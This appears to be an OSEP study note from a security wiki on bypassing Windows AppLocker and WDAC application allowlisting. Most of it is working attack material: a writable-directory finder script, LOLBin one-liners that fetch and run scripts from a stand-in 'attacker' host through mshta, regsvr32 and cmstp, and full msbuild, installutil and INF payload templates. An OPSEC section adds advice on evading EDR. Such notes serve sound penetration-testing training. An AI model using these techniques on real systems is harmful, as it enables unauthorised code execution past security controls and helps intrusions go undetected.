---
title: AppLocker bypass techniques
slug: applocker-bypass-techniques
aliases: [applocker-bypass, wdac-bypass]
---

{% raw %}

> **TL;DR:** AppLocker (and the newer WDAC) is an allowlist. It blocks execution by path, publisher, or hash. Bypasses fall into four buckets: (1) write your payload to an *allowlisted* path, (2) execute via a *signed Microsoft LOLBin* the policy trusts, (3) abuse DLL load rules that are weaker than EXE rules, (4) load .NET code via signed assemblies. This is the OSEP execution-policy bypass note; companion to [[jscript-hta-wsh-initial-access]] and [[wldp-bypass]].

## How AppLocker decides

Rules per file type (Executable, DLL, Script, MSI, Packaged app):
- **Path** rule — anything under `%WINDIR%\System32\*`.
- **Publisher** rule — anything signed by `*Microsoft*`.
- **Hash** rule — exact file hash.

Default rules let everything in `%WINDIR%` and `%PROGRAMFILES%` run. That's the foothold.

Enumerate the policy on the target:
```powershell
Get-AppLockerPolicy -Effective -Xml | Out-File policy.xml
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Users\me\evil.exe
```

## Bucket 1 — write to an allowlisted path

If `%WINDIR%\System32\spool\drivers\color\` is user-writable (it often is), dropping a binary there lets it run under the path rule for `%WINDIR%`.

Common writable subdirs under default rules:
- `C:\Windows\Tasks`
- `C:\Windows\Temp`
- `C:\Windows\Tracing`
- `C:\Windows\System32\Tasks\Microsoft\Windows\PLA\Reports`
- `C:\Windows\System32\spool\drivers\color`
- `C:\Windows\Registration\CRMLog`
- `C:\Windows\System32\FxsTmp`

```powershell
$writable = @(
  "$env:WINDIR\Tasks",
  "$env:WINDIR\Temp",
  "$env:WINDIR\Tracing",
  "$env:WINDIR\System32\spool\drivers\color",
  "$env:WINDIR\Registration\CRMLog"
)
foreach ($p in $writable) {
  try { "test" | Out-File "$p\.t" -ErrorAction Stop; Remove-Item "$p\.t"; "$p OK" } catch {}
}
```

If a path is writable, drop your loader there and run it; AppLocker is satisfied by the path.

## Bucket 2 — LOLBins

A LOLBin (Living-Off-The-Land Binary) is a signed Microsoft executable in `%WINDIR%` (publisher-rule-allowed) that can be coaxed into running arbitrary code.

| Binary | Trick | Notes |
|---|---|---|
| `rundll32.exe` | `rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc.exe")` | runs JScript inline |
| `mshta.exe` | `mshta http://attacker/x.hta` | HTA execution |
| `regsvr32.exe` | `regsvr32 /s /n /u /i:http://attacker/x.sct scrobj.dll` | Squiblydoo |
| `installutil.exe` | `InstallUtil.exe /U evil.exe` | runs `Uninstall` method of a .NET assembly *without* signature check |
| `msbuild.exe` | `msbuild evil.xml` | XML project file with inline C# task — full code exec |
| `cmstp.exe` | `cmstp /au evil.inf` | INF auto-installer; LaunchInfSectionEx loads DLL |
| `regsvcs.exe` / `regasm.exe` | register a malicious .NET assembly | similar to installutil |

Three you must memorise for OSEP:

### msbuild (the cleanest one)

```xml
<!-- evil.xml -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello"><Hello /></Target>
  <UsingTask TaskName="Hello" TaskFactory="CodeTaskFactory"
             AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class Hello : Task {
          public override bool Execute() {
            System.Diagnostics.Process.Start("calc.exe");
            return true;
          }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```text
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe evil.xml
```

MSBuild is signed by Microsoft, sits in `%WINDIR%`, and happily compiles C# at runtime.

### installutil (the .NET trick)

```csharp
// evil.cs — note the public methods Install() and Uninstall()
using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
[RunInstaller(true)]
public class Sample : Installer {
    public override void Uninstall(IDictionary savedState) {
        System.Diagnostics.Process.Start("calc.exe");
    }
}
```

```text
csc.exe /target:library /out:evil.exe evil.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U evil.exe
```

`/U` invokes `Uninstall` without the standard signature check. AppLocker's executable rule sees `InstallUtil.exe` (signed) — your `evil.exe` is loaded as a library, not executed directly.

### cmstp (INF abuse)

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://attacker/x.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Internet"
ShortSvcName="Internet"
```

```text
cmstp.exe /au evil.inf
```

## Bucket 3 — DLL rules are weaker

Default AppLocker policies **don't enable DLL rules** (they slow boot). So `regsvr32 /s evil.dll` may run even if `evil.exe` would be blocked. Same for `rundll32 evil.dll,EntryPoint`.

Check whether DLL rules are on:
```powershell
(Get-AppLockerPolicy -Effective -Xml | Select-Xml -XPath "//RuleCollection[@Type='Dll']").Node
```

## Bucket 4 — .NET reflection in a trusted host

Load `System.Reflection` inside a JScript or PowerShell host that AMSI/CLM hasn't fully constrained, and invoke arbitrary assembly bytes from memory. Combined with a small `installutil` / `msbuild` trampoline you get a full payload load with no on-disk EXE matching a blocked rule.

## WDAC (Windows Defender Application Control) differences

WDAC is stricter than AppLocker:
- Kernel-enforced (not just user-mode).
- Default policies *do* enforce script and DLL rules.
- HVCI integration — code integrity at hypervisor level.
- Bypasses tend to require driver-level abuse or signed-but-vulnerable binaries (the "BYOVD" technique).

Still, many of the same LOLBins are allowed under common WDAC starter policies (Microsoft's recommended block-list updates regularly; LOLBAS tracks the gaps).

## OPSEC

Each LOLBin chain has well-known signatures:
- `wmic.exe child of svchost.exe`
- `msbuild.exe writing to %TEMP%`
- `installutil.exe with /U`

Mature EDR catches these by parent-child + command-line. OSEP-grade tradecraft therefore: drop the chain to the absolute minimum (a single LOLBin → in-memory loader) and avoid spawning child processes the EDR is watching for.

## References
- [LOLBAS project](https://lolbas-project.github.io/)
- [Microsoft — AppLocker design guide](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/applocker/)
- [Oddvar Moe — Bypassing AppLocker](https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/)
- [bohops — LOLBins research](https://bohops.com/)
- See also: [[jscript-hta-wsh-initial-access]], [[wldp-bypass]], [[amsi-bypass]], [[living-off-the-land]]

{% endraw %}
